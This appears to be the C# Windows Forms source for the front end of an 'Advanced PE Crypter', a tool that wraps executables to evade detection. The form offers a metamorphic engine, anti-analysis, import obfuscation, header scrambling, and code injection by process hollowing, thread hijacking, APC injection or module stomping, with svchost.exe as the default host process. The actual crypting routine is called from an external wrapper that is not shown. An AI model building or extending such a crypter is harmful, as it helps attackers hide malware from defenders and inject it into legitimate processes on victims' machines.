using System;
using System.Windows.Forms;
using System.Drawing;
using System.IO;

namespace CrypterGUI
{
    public partial class MainForm : Form
    {
        private string inputFile = string.Empty;
        private string outputFile = string.Empty;

        public MainForm()
        {
            InitializeComponent();
            this.Icon = Properties.Resources.AppIcon;
        }

        private void InitializeComponent()
        {
            // Form settings
            this.Text = "Advanced PE Crypter";
            this.Size = new Size(600, 500);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;

            // Input file section
            var inputLabel = new Label
            {
                Text = "Input File:",
                Location = new Point(20, 20),
                AutoSize = true
            };

            var inputTextBox = new TextBox
            {
                Location = new Point(20, 45),
                Width = 450,
                ReadOnly = true
            };

            var inputButton = new Button
            {
                Text = "Browse",
                Location = new Point(480, 43),
                Width = 80
            };
            inputButton.Click += (s, e) =>
            {
                using (var ofd = new OpenFileDialog())
                {
                    ofd.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        inputFile = ofd.FileName;
                        inputTextBox.Text = inputFile;
                    }
                }
            };

            // Output file section
            var outputLabel = new Label
            {
                Text = "Output File:",
                Location = new Point(20, 80),
                AutoSize = true
            };

            var outputTextBox = new TextBox
            {
                Location = new Point(20, 105),
                Width = 450,
                ReadOnly = true
            };

            var outputButton = new Button
            {
                Text = "Browse",
                Location = new Point(480, 103),
                Width = 80
            };
            outputButton.Click += (s, e) =>
            {
                using (var sfd = new SaveFileDialog())
                {
                    sfd.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        outputFile = sfd.FileName;
                        outputTextBox.Text = outputFile;
                    }
                }
            };

            // Options group
            var optionsGroup = new GroupBox
            {
                Text = "Protection Options",
                Location = new Point(20, 150),
                Size = new Size(540, 200)
            };

            var metamorphicCheck = new CheckBox
            {
                Text = "Metamorphic Engine",
                Location = new Point(20, 30),
                Checked = true
            };

            var antiAnalysisCheck = new CheckBox
            {
                Text = "Anti-Analysis Protection",
                Location = new Point(20, 60),
                Checked = true
            };

            var randomSectionsCheck = new CheckBox
            {
                Text = "Random Sections",
                Location = new Point(20, 90),
                Checked = true
            };

            var importObfuscationCheck = new CheckBox
            {
                Text = "Import Obfuscation",
                Location = new Point(20, 120),
                Checked = true
            };

            var headerScramblingCheck = new CheckBox
            {
                Text = "Header Scrambling",
                Location = new Point(20, 150),
                Checked = true
            };

            var injectionLabel = new Label
            {
                Text = "Injection Method:",
                Location = new Point(250, 30),
                AutoSize = true
            };

            var injectionCombo = new ComboBox
            {
                Location = new Point(250, 55),
                Width = 200,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            injectionCombo.Items.AddRange(new string[] {
                "Process Hollowing",
                "Thread Hijacking",
                "APC Injection",
                "Module Stomping"
            });
            injectionCombo.SelectedIndex = 0;

            var targetProcessLabel = new Label
            {
                Text = "Target Process:",
                Location = new Point(250, 90),
                AutoSize = true
            };

            var targetProcessText = new TextBox
            {
                Text = "svchost.exe",
                Location = new Point(250, 115),
                Width = 200
            };

            optionsGroup.Controls.AddRange(new Control[] {
                metamorphicCheck, antiAnalysisCheck, randomSectionsCheck,
                importObfuscationCheck, headerScramblingCheck,
                injectionLabel, injectionCombo,
                targetProcessLabel, targetProcessText
            });

            // Build button
            var buildButton = new Button
            {
                Text = "Build",
                Location = new Point(20, 370),
                Size = new Size(540, 40),
                Font = new Font(Font.FontFamily, 10, FontStyle.Bold)
            };
            buildButton.Click += (s, e) =>
            {
                if (string.IsNullOrEmpty(inputFile) || string.IsNullOrEmpty(outputFile))
                {
                    MessageBox.Show("Please select input and output files.", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                try
                {
                    var config = new CrypterConfig
                    {
                        UseMetamorphic = metamorphicCheck.Checked,
                        UseAntiAnalysis = antiAnalysisCheck.Checked,
                        AddRandomSections = randomSectionsCheck.Checked,
                        ObfuscateImports = importObfuscationCheck.Checked,
                        ScrambleHeaders = headerScramblingCheck.Checked,
                        InjectionType = injectionCombo.SelectedIndex,
                        TargetProcess = targetProcessText.Text
                    };

                    if (CrypterWrapper.CryptFile(inputFile, outputFile, config))
                    {
                        MessageBox.Show("File encrypted successfully!", "Success",
                            MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("Failed to encrypt file.", "Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error: {ex.Message}", "Error",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            };

            // Status strip
            var statusStrip = new StatusStrip();
            var statusLabel = new ToolStripStatusLabel("Ready");
            statusStrip.Items.Add(statusLabel);

            // Add controls to form
            this.Controls.AddRange(new Control[] {
                inputLabel, inputTextBox, inputButton,
                outputLabel, outputTextBox, outputButton,
                optionsGroup, buildButton, statusStrip
            });
        }
    }

    public class CrypterConfig
    {
        public bool UseMetamorphic { get; set; }
        public bool UseAntiAnalysis { get; set; }
        public bool AddRandomSections { get; set; }
        public bool ObfuscateImports { get; set; }
        public bool ScrambleHeaders { get; set; }
        public int InjectionType { get; set; }
        public string TargetProcess { get; set; }
    }
}
